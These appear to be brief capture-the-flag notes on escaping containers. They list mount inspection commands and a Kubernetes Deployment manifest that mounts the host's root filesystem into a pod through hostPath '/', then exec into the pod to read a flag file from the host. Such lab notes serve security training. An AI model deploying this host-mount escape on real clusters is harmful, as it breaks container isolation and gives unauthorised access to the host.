## Docker

mount

mount | grep /mnt

cat /tmp/rootfs/opt/flag.txt

## K8s

```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
  labels:
    app: nginx
spec:
  replicas: 1
  selector:
    matchLabels:
      app: nginx
  template:
    metadata:
      labels:
        app: nginx
    spec:
      nodeSelector:
        kubernetes.io/hostname: k3d-sec-server-0
      containers:
      - name: nginx
        image: nginx:1.14.2
        ports:
        - containerPort: 80
        volumeMounts:
        - mountPath: /tmp/rootfs
          name: host-path
      volumes:
      - name: host-path
        hostPath:
          path: /
          type: Directory
```

kubectl exec -it deployment.apps/nginx-deployment -- bash
cat /tmp/rootfs/opt/flag.txt